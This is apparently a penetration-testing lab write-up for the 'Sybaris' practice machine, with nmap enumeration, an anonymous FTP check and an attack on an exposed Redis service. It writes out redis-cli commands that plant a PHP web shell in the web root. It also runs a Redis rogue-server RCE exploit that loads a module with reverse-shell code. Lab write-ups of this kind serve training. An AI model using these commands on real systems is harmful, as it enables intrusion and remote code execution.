# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Sun Jan 23 06:43:44 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sybaris/results/192.168.171.93/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sybaris/results/192.168.171.93/scans/xml/_full_tcp_nmap.xml" 192.168.171.93
Nmap scan report for 192.168.171.93
Host is up, received user-set (0.25s latency).
Scanned at 2022-01-23 06:43:46 EST for 403s
Not shown: 65519 filtered ports
Reason: 65519 no-responses
PORT      STATE  SERVICE   REASON         VERSION
20/tcp    closed ftp-data  reset ttl 63
21/tcp    open   ftp       syn-ack ttl 63 vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.171
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 21:94:de:d3:69:64:a8:4d:a8:f0:b5:0a:ea:bd:02:ad (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoWnaSOW2cc+sYUe6aqQSPWY9e9OWgerEomQZv6FujchbKcxcm6sPRTZJnGrPsDum5vx7otZDGG9Vc55NByLaLU9WoQTLPhnepGTMzbbg9DyIDR9HXFw3fX0s+vSvjvDo/Cz19gWKTB2lBfJgPa239Hp0NmaxOAXmJ+d+oUEmnhLmZ1wAQFvJ/9Ta2zt8q6KOvjykUcISuFwr741HwcudFS4Z84LsO+WbcIGtkTELLn9yFc3KiZraJYNi72rOKsxHip/98js8nEIsryRfo6sZexu4lxT5SchvDNQCirLSHsEIFyzde5Ym5FDf4hb831SwJqFg7qDO+wDT1/oZp/dnP
|   256 67:42:45:19:8b:f5:f9:a5:a4:cf:fb:87:48:a2:66:d0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLoSyEH4GdzHPYxZPUgKP068JBcpx5KSL1KzaMRo9xP4ai5QKUKJ+H2xu8atQdvkE0ul6GnDPVlZ5Flf/npwYWY=
|   256 f3:e2:29:a3:41:1e:76:1e:b1:b7:46:dc:0b:b9:91:77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH4F/u2LLgVpGw2tr0bpe0MgbiV36HAzwcu5HqcuShJd
53/tcp    closed domain    reset ttl 63
80/tcp    open   http      syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: A4DA8778FE902EB34FD9A5D4C0A832E1
|_http-generator: HTMLy v2.7.5
| http-methods: 
|_  Supported Methods: GET POST
| http-robots.txt: 11 disallowed entries 
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
|_http-title: Sybaris - Just another HTMLy blog
6379/tcp  open   redis     syn-ack ttl 63 Redis key-value store 5.0.9
10091/tcp closed unknown   reset ttl 63
10092/tcp closed unknown   reset ttl 63
10093/tcp closed unknown   reset ttl 63
10094/tcp closed unknown   reset ttl 63
10095/tcp closed unknown   reset ttl 63
10096/tcp closed unknown   reset ttl 63
10097/tcp closed unknown   reset ttl 63
10098/tcp closed unknown   reset ttl 63
10099/tcp closed unknown   reset ttl 63
10100/tcp closed itap-ddtp reset ttl 63
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.10 - 3.12 (93%), Linux 4.4 (93%), Linux 4.9 (92%), Linux 4.0 (89%), Linux 3.10 (88%), Linux 3.11 - 4.1 (88%), Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 2.6.39 (88%), Linux 3.5 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/23%OT=21%CT=20%CU=%PV=Y%DS=2%DC=T%G=N%TM=61ED4105%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10A%TI=Z%II=I%TS=A)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.003 days (since Sun Jan 23 06:45:48 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   257.35 ms 192.168.49.1
2   257.34 ms 192.168.171.93

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 23 06:50:29 2022 -- 1 IP address (1 host up) scanned in 406.13 seconds

```

## 21 - FTP

```                                                                   
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ ftp 192.168.171.93 
Connected to 192.168.171.93.
220 (vsFTPd 3.0.2)
Name (192.168.171.93:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> lcd /tmp
Local directory now /tmp
ftp> put t
local: t remote: t
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp> ls
200 PORT command successful. Consider using PASV.
425 Failed to establish connection.
ftp> exit
421 Timeout.

```

## 80 - Web

![](Pasted%20image%2020220123203320.png)

![](Pasted%20image%2020220123203307.png)

## 6379 - Redis

### Web shell

```
┌──(kali㉿kali)-[/tmp]
└─$ redis-cli -h 192.168.171.93 
192.168.171.93:6379> config get dir
1) "dir"
2) "/"
192.168.171.93:6379> config set dir /var/www/html
OK
192.168.171.93:6379> config set dbfilename redis.php
OK
192.168.171.93:6379> set test "<form method='GET'><input type='TEXT' name='cmd' id='cmd' size='80'><input type='SUBMIT' value='Execute'></form><pre><?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?></pre>"
OK
192.168.171.93:6379> save
(error) ERR
192.168.171.93:6379> config set dir /tmp
OK
192.168.171.93:6379> save
OK
192.168.171.93:6379> config set dir /nonexistent
(error) ERR Changing directory: No such file or directory
192.168.171.93:6379> config set dir /usr/share/nginx/html 
(error) ERR Changing directory: No such file or directory
192.168.171.93:6379> 

```

### RCE Exploit Test


```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/Ridter/redis-rce.git                                                                                                               1 ⚙
Cloning into 'redis-rce'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (1/1), done.
remote: Total 18 (delta 0), reused 0 (delta 0), pack-reused 17
Receiving objects: 100% (18/18), 15.19 KiB | 5.06 MiB/s, done.
Resolving deltas: 100% (6/6), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd redis-rce                                                                                                                                                    1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ sudo python redis-rce.py -r 192.168.123.69  -L 192.168.49.123  -f ../RedisModules-ExecuteCommand/module.so -P 6379                                              1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ cd ..                                                                                                                                                     130 ⨯ 1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git                                                                                           1 ⚙
Cloning into 'RedisModules-ExecuteCommand'...
remote: Enumerating objects: 494, done.
remote: Total 494 (delta 0), reused 0 (delta 0), pack-reused 494
Receiving objects: 100% (494/494), 207.20 KiB | 6.91 MiB/s, done.
Resolving deltas: 100% (286/286), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd RedisModules-ExecuteCommand                                                                                                                                  1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/RedisModules-ExecuteCommand]
└─$ make                                                                                                                                                            1 ⚙
make -C ./src
make[1]: Entering directory '/tmp/RedisModules-ExecuteCommand/src'
make -C ../rmutil
make[2]: Entering directory '/tmp/RedisModules-ExecuteCommand/rmutil'
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o util.o util.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o strings.o strings.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o sds.o sds.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o vector.o vector.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o alloc.o alloc.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o periodic.o periodic.c
ar rcs librmutil.a util.o strings.o sds.o vector.o alloc.o periodic.o
make[2]: Leaving directory '/tmp/RedisModules-ExecuteCommand/rmutil'
gcc -I../ -Wall -g -fPIC -lc -lm -std=gnu99     -c -o module.o module.c
module.c: In function ‘DoCommand’:
module.c:16:29: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   16 |                 char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                             ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:23:29: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:11:1: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
   10 | #include <netinet/in.h>
  +++ |+#include <string.h>
   11 | 
module.c:23:29: warning: incompatible implicit declaration of built-in function ‘strlen’ [-Wbuiltin-declaration-mismatch]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:23:29: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c:27:25: warning: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
   27 |                         strcat(output, buf);
      |                         ^~~~~~
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:27:25: warning: incompatible implicit declaration of built-in function ‘strcat’ [-Wbuiltin-declaration-mismatch]
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:29:80: warning: incompatible implicit declaration of built-in function ‘strlen’ [-Wbuiltin-declaration-mismatch]
   29 |                 RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
      |                                                                                ^~~~~~
module.c:29:80: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c: In function ‘RevShellCommand’:
module.c:41:28: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   41 |                 char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                            ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:42:32: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   42 |                 char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
      |                                ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:48:38: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
   48 |                 sa.sin_addr.s_addr = inet_addr(ip);
      |                                      ^~~~~~~~~
module.c:57:17: warning: argument 2 null where non-null expected [-Wnonnull]
   57 |                 execve("/bin/sh", 0, 0);
      |                 ^~~~~~
In file included from module.c:4:
/usr/include/unistd.h:561:12: note: in a call to function ‘execve’ declared ‘nonnull’
  561 | extern int execve (const char *__path, char *const __argv[],
      |            ^~~~~~
ld -o module.so module.o -shared -Bsymbolic  -L../rmutil -lrmutil -lc 
make[1]: Leaving directory '/tmp/RedisModules-ExecuteCommand/src'
cp ./src/module.so .
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/RedisModules-ExecuteCommand]
└─$ cd ../redis-rce                                                                                                                                                 1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ sudo python redis-rce.py -r 192.168.171.93  -L 192.168.49.171  -f ../RedisModules-ExecuteCommand/module.so -P 6379                                              1 ⚙
[sudo] password for kali: 

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.171.93:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.171.93:6379
[*] Setting filename
[+] Accepted connection from 192.168.171.93:6379
[*] Start listening on 192.168.49.171:6379
[*] Tring to run payload
[+] Accepted connection from 192.168.171.93:37481
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i
[+] Interactive shell open , use "exit" to exit...
$ whoami
[-] Error:-ERR unknown command `system.exec`, with args beginning with: `whoami`, , check your module!
[*] Clean up..
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$   
```

# Others